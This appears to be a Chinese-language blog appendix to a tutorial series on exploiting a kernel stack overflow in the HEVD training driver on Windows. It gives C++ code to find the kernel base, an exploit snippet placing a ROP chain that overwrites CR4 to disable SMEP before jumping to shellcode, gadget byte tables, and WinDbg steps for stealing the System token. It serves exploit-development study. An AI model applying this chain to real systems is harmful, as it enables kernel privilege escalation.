<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin | ã€Win Pwnã€‘HEVD-å†…æ ¸æ ˆæº¢å‡º(ä¸‹)</title><meta name="description" content="&lt;hr /&gt;
&lt;p&gt;ä¸Šï¼š&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸­ï¼š&lt;a href=&quot;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&quot;&gt;https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š&lt;a href=&quot;https://xz.aliyun.com/t/13365&quot;&gt;https://xz.aliyun.com/t/13365&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æœ¬é™„å½•å¯¹ç¬¬äºŒç« çš„ä»¥ä¸‹å‡ ä¸ªé—ç•™é—®é¢˜åšå‡ºè¯´æ˜&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;userç¼–ç¨‹å¯»æ‰¾ROPGadget&lt;/li&gt;
&lt;li&gt;shellcodeç¼–å†™&lt;/li&gt;
&lt;li&gt;Tokenææƒ&lt;/li&gt;
&lt;li&gt;KVAS&lt;/li&gt;
&lt;/ul&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">ã€Win Pwnã€‘HEVD-å†…æ ¸æ ˆæº¢å‡º(ä¸‹)</h3><div class="article__date metadata"><div class="post-info">2024/01/25</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/kernel/">kernel</a><a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><hr />
<p>ä¸Šï¼š<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</a></p>
<p>ä¸­ï¼š<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</a></p>
<p>æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13365">https://xz.aliyun.com/t/13365</a></p>
<p>æœ¬é™„å½•å¯¹ç¬¬äºŒç« çš„ä»¥ä¸‹å‡ ä¸ªé—ç•™é—®é¢˜åšå‡ºè¯´æ˜</p>
<ul>
<li>userç¼–ç¨‹å¯»æ‰¾ROPGadget</li>
<li>shellcodeç¼–å†™</li>
<li>Tokenææƒ</li>
<li>KVAS</li>
</ul>
<span id="more"></span>
<h1 id="userç¼–ç¨‹å¯»æ‰¾ropgadget"><a class="markdownIt-Anchor" href="#userç¼–ç¨‹å¯»æ‰¾ropgadget"></a> userç¼–ç¨‹å¯»æ‰¾ROPGadget</h1>
<p>ROPå…¨ç§°åŠ è¿”å›å¯¼å‘æ€§ç¼–ç¨‹ï¼Œæ¯”å¦‚è¿™ä¸€ç« ç”¨åˆ°çš„Gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mov cr4, rcx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>å…³äº<code>ret</code>æ±‡ç¼–æœ¬è´¨ä¸Šå°±æ˜¯ä»æ ˆå¸§ä¸­å–å‡ºå€¼ï¼Œç„¶åå°†<code>ip</code>å¯„å­˜å™¨è®¾ç½®ä¸ºè¯¥å€¼ï¼Œç­‰ä»·äº<code>pop ip</code>ï¼Œè¿™æ ·å°±èƒ½å®Œæˆå‡½æ•°è°ƒç”¨çš„è¿”å›ç­‰ç­‰ã€‚</p>
<p>æœ¬ç« ä¸­å½“æˆ‘ä»¬å‘ç”Ÿæ ˆæº¢å‡ºæ—¶ï¼Œå°±ä¼šæŠŠ<code>ret</code>çš„ä½ç½®è®¾ç½®ä¸ºç¬¬ä¸€æ®µgadgetçš„ä½ç½®</p>
<ul>
<li><code>pop rcx</code>å°±ä¼šå°†æ­¤æ—¶æ ˆé¡¶çš„å€¼<code>0x00000000002506f8</code>å­˜å…¥<code>rcx</code>å¯„å­˜å™¨ï¼Œç„¶å<code>ret</code>åˆä»æ ˆé¡¶å–å‡ºåœ°å€<code>mov_rc4_rcx_ret</code>ï¼Œç„¶å<code>rip</code>å¯„å­˜å™¨å°±è·³è½¬æ‰§è¡Œäº†</li>
<li><code>mov rc4, rcx</code>å°†<code>rcx</code>å€¼å­˜å…¥<code>rc4</code>ä¸­ç„¶å<code>ret</code>åˆå°†æ ˆé¡¶çš„å€¼<code>shellcode_addr</code>è®¾ç½®ä¸º<code>rip</code>å¯„å­˜å™¨çš„å€¼åè¿”å›</li>
</ul>
<p>ç»†å¿ƒä¸€ç‚¹å°±ä¼šå‘ç°æœ¬ç« æˆªå›¾ä¸­çš„åœ°å€ä¸ä¸€æ ·ï¼Œå› ä¸ºå†…æ ¸åŠ è½½æ—¶çš„å†…å­˜è™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯éšæœºåŒ–çš„ï¼Œä¸è¿‡å¯»å€æ–¹å¼ä¾æ—§æ˜¯<code>åŸºåœ°å€</code>+<code>åç§»</code></p>
<p>è¿™å°±å¼•ç”³å‡ºå‡½æ•°ç¬¬ä¸€æ®µä»£ç ï¼šæ‰¾åˆ°å†…æ ¸çš„åŸºåœ°å€</p>
<h2 id="aæ‰¾åˆ°å†…æ ¸åŸºåœ°å€"><a class="markdownIt-Anchor" href="#aæ‰¾åˆ°å†…æ ¸åŸºåœ°å€"></a> A.æ‰¾åˆ°å†…æ ¸åŸºåœ°å€</h2>
<p>é€šè¿‡<code>NtQuerySystemInformation </code>è¿™ä¸ªâ€œåŠéšè—â€å‡½æ•°å®ç°çš„</p>
<p>MSDNï¼š<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in, out] SystemInformation</span><br></pre></td></tr></table></figure>
<p>æŒ‡å‘æ¥æ”¶è¯·æ±‚ä¿¡æ¯çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚ æ­¤ä¿¡æ¯çš„å¤§å°å’Œç»“æ„å›  <em>SystemInformationClass</em> å‚æ•°çš„å€¼è€Œå¼‚ï¼š</p>
</blockquote>
<p>å¾ˆå¯æƒœï¼Œå…³äº<code>SystemInformationClass</code>å¾®è½¯å¹¶æ²¡æœ‰å…¬å¼€å®ƒçš„è®¾è®¡ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…³äºæ­¤çš„èµ„æ–™</p>
<p><code>SYSTEM_INFORMATION_CLASS</code>ï¼š<a target="_blank" rel="noopener" href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm</a></p>
<p>ä»–æ˜¯ä¸€ä¸ªæšä¸¾ï¼Œå…¶ä¸­<code>0xB</code>å°±ä»£è¡¨ç€è¦æŸ¥è¯¢çš„æ˜¯<code>SystemModuleInformation</code></p>
<p><code>SYSTEM_MODULE</code>ï¼š<a target="_blank" rel="noopener" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html">http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_MODULE</span> &#123;</span><br><span class="line">  ULONG                Reserved1;</span><br><span class="line">  ULONG                Reserved2;</span><br><span class="line">  PVOID                ImageBaseAddress;</span><br><span class="line">  ULONG                ImageSize;</span><br><span class="line">  ULONG                Flags;</span><br><span class="line">  WORD                 Id;</span><br><span class="line">  WORD                 Rank;</span><br><span class="line">  WORD                 w018;</span><br><span class="line">  WORD                 NameOffset;</span><br><span class="line">  BYTE                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125; SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br></pre></td></tr></table></figure>
<p><code>SystemInformation</code>å°±æ˜¯ç”±<code>SYSTEM_MODULE</code>æ•°ç»„ä½œä¸ºæˆå‘˜çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªæ²¡æœ‰å®˜æ–¹æ–‡æ¡£ï¼Œä¹Ÿæ˜¯é€šè¿‡é€†å‘å¾—åˆ°çš„</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG                ModulesCount;</span><br><span class="line">	SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure>
<p>å…³äºæŸ¥è¯¢å‡½æ•°çš„å®šä¹‰ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>é¦–å…ˆä»<code>ntdll</code>å¯¼å…¥å‡½æ•°</li>
<li>ç„¶ååˆå§‹åŒ–å˜é‡</li>
<li>æŸ¥è¯¢åæ‰“å°å¹¶è¿”å›ï¼Œå¦‚æœæ²¡æœ‰æŸ¥åˆ°å°±è¿”å›0</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span> </span>&#123;</span><br><span class="line">	PVOID kernelImageBase = <span class="literal">NULL</span>;</span><br><span class="line">	PCHAR kernelImage = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//import function `NtQuerySystemInformation`</span></span><br><span class="line">	HMODULE ntdll = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;ntdll&quot;</span>));</span><br><span class="line">	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(ntdll, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (NtQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress() failed.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//init length</span></span><br><span class="line">	ULONG len = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;len);</span><br><span class="line">	<span class="comment">//init module infomations</span></span><br><span class="line">	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)<span class="built_in">GlobalAlloc</span>(GMEM_ZEROINIT, len);</span><br><span class="line">	<span class="keyword">if</span> (pModuleInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase]  Could not allocate memory for module info.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//starting quering</span></span><br><span class="line">	NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, pModuleInfo, len, &amp;len);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123;</span><br><span class="line">		kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(kernelImage, ModuleName)) &#123;</span><br><span class="line">			kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[*] [ulGetKernelBase]  Mod name %s &quot;</span>, kernelImage);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%llx\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%X\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">			<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)kernelImageBase;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="b-æ‰¾åˆ°å¯¹åº”æ±‡ç¼–"><a class="markdownIt-Anchor" href="#b-æ‰¾åˆ°å¯¹åº”æ±‡ç¼–"></a> B. æ‰¾åˆ°å¯¹åº”æ±‡ç¼–</h2>
<p>å¯ä»¥ä½¿ç”¨CTFå¸¸ç”¨å·¥å…·<code>ROPGadget</code>ï¼Œä»–æ”¯æŒ<code>PE</code>æ ¼å¼ï¼ˆå› ä¸ºç”¨çš„Capstoneåæ±‡ç¼–å¼•æ“ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
<p>è¯•è¯•<code>ntoskrl.exe</code>çš„</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5932a20543fd1420ae321f901e1f4c44.png" alt="image-20240119172454699" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000014039eb47 : mov cr4, rcx ; ret</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°åŸºåœ°å€æ˜¯<code>0x39eb47</code>ï¼Œå¦å¤–ä¸€ä¸ªgadgetåŒç†</p>
<p>é‡å†™ä¿®æ”¹ä¸‹EXP</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx = base+ <span class="number">0x20C64C</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_cr4_rcx = base+ <span class="number">0x39eb47</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx;</span><br><span class="line"><span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_cr4_rcx;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/14da4b6cf8f39c3a16855b7a20fbf476.png" alt="image-20240119174839482" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6c94aaf54fc86ee593668486a2df81a4.png" alt="image-20240119174924327" /></p>
<p>ä¸€äº›å¸¸è§çš„gadgetå­—èŠ‚åºåˆ—</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;RET&quot;</span> , &#123; <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RCX&quot;</span>, &#123; <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_CR4_RCX&quot;</span>, &#123; <span class="number">0x0f</span>, <span class="number">0x22</span>, <span class="number">0xe1</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;NOP&quot;</span>, &#123; <span class="number">0x4d</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX_POP_RCX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RCX_PTRRAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x08</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RAX_PTRRCX&quot;</span>, &#123; <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_RAX_RAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_ESI_ESI&quot;</span>, &#123; <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæƒ³ç›´æ¥ä»äºŒè¿›åˆ¶è¯»å–ï¼ˆè¿™æ ·æ›´å¿«ï¼‰å¯ä»¥ä½¿ç”¨ï¼š<a target="_blank" rel="noopener" href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a> æä¾›çš„æ€è·¯å»æ‰¾</p>
<h1 id="shellcodeç¼–å†™"><a class="markdownIt-Anchor" href="#shellcodeç¼–å†™"></a> shellcodeç¼–å†™</h1>
<h2 id="a-æ‰‹åŠ¨è¿›è¡Œtokenææƒ"><a class="markdownIt-Anchor" href="#a-æ‰‹åŠ¨è¿›è¡Œtokenææƒ"></a> A. æ‰‹åŠ¨è¿›è¡ŒTokenææƒ</h2>
<p>ç¬¬äºŒç« ä¸­ä½¿ç”¨çš„æ˜¯ä»–äººæä¾›çš„shellcodeï¼Œè¿™é‡Œå°è¯•è‡ªå·±å†™æ±‡ç¼–</p>
<p>æ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬å·²ç»è¿›å…¥å†…æ ¸äº†ï¼Œæ‰€ä»¥åšçš„äº‹æƒ…å’Œuserçº§åˆ«ä¸ä¸€æ ·</p>
<p>åŒ<code>KRPOCESS</code>ä¸åŒçš„æ˜¯<code>EPROCESS</code>æè¿°äº†ç¨‹åºè¿è¡Œçš„ç›¸å…³ç¯å¢ƒï¼Œä¾‹å¦‚ï¼šå¯¹åº”çš„<code>KPROCESS</code>æŒ‡é’ˆã€ç¨‹åºçš„æƒé™ç­‰</p>
<p>åœ¨windbgä¸­ä½¿ç”¨ ï¼Œå¯ä»¥åˆ—ä¸¾æ‰€æœ‰çš„è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!process 0 0 &lt;process_name&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d79ca59d6f4e93813d144c57ed739409.png" alt="image-20240119180801648" /></p>
<p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹å¯¹åº”çš„EPROCESSç»“æ„ä½“ï¼Œè¿™é‡ŒæŸ¥çœ‹<code>System</code>è¿›ç¨‹çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt nt!_EPROCESS &lt;Process address&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ab3f24cc80b2f59949d0f14718347944.png" alt="image-20240119181007630" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e55eccd39e6efc555de0f0b2aae95b32.png" alt="image-20240119181255215" /></p>
<p>Tokenæ˜¯ä¸€ä¸ª<code>_EX_FAST_REF</code>ç±»å‹çš„Unionå€¼</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/197b66077a9385505b318f09962398af.png" alt="image-20240119181935137" /></p>
<p><code>RefCnt</code>è®°å½•äº†Tokenå¼•ç”¨çš„æ•°ç›®ï¼Œæ˜¯æ•°æ®çš„ä½4ä½(64ä½ä¸­ï¼Œ32ä½æ˜¯3ä½)</p>
<p>å°†å½“å‰è¿›ç¨‹çš„é™¤<code>RefCnt</code>ä»¥å¤–çš„å…¶ä»–bitä½è®¾ç½®ä¸ºå’ŒSystemçš„ä¸€è‡´å°±è¡Œäº†ï¼Œ</p>
<p>è¿™é‡Œ <code>Value</code>ä¸æ©ç <code>-0xd</code>ï¼ˆRefCountï¼‰è¿›è¡Œ<code>&amp;</code>è¿ç®—å°±èƒ½å¾—åˆ°çœŸå®çš„Tokenå€¼</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3783b0486f34520cceef6f7e7d4bc37b.png" alt="image-20240119183143972" /></p>
<p>ç°åœ¨å°†è®¡ç®—å‡ºçš„Tokenå€¼å¤åˆ¶ç»™cmd.exeï¼ˆ<strong>è¿™æ˜¯ä¸€ä¸ªæ–°çš„Token</strong>ï¼‰</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/bd96556683f06ae537f449787700abd7.png" alt="image-20240119183328877" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/84780c5e389c5cc5645419cd3ec999ec.png" alt="image-20240119183538886" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9345344e4adc9083467b09c76f86fa74.png" alt="image-20240119183521964" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9ad936fd2b23d649493103c25b0cad43.png" alt="image-20240119183609699" /></p>
<h2 id="b-è¿›è¡Œshellcodeç¼–å†™"><a class="markdownIt-Anchor" href="#b-è¿›è¡Œshellcodeç¼–å†™"></a> B. è¿›è¡ŒShellcodeç¼–å†™</h2>
<p>åœ¨åˆšæ‰çš„<code>EPROCESS</code>ä¸­ï¼Œæœ‰ä¸€æ®µè®°å½•çš„æ˜¯ç¨‹åºçš„é“¾è¡¨ï¼š<code>ActiveProcessLinks</code>ï¼Œè€Œä¸”windowsä¼šç”Ÿæˆä¸€æ®µç‹¬ç‰¹çš„æ ‡è¯†æ¥æ ‡è®°æ¯ä¸€ä¸ªç¨‹åºï¼š<code>UniqueProcessId</code>ï¼Œåœ¨è¿™æ®µ <strong>åŒå‘</strong> é“¾è¡¨ä¸Šæ¯æ®µç¨‹åºéƒ½å¯ä»¥è¢«æ‰¾åˆ°ï¼Œå› ä¸ºå¯ä»¥å‘å‰å’Œå‘åæŸ¥æ‰¾ï¼Œ<strong>ä¸€èˆ¬Systemä½äºé“¾è¡¨å¼€å¤´ï¼Œæ‰€ä»¥æ²¿ç€FlinkæŸ¥æ‰¾</strong></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f5708429025f321352aa000e50780c46.png" alt="image-20240119193844612" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0595f0087054b0dca2dee10c43392202.png" alt="image-20240119193859162" /></p>
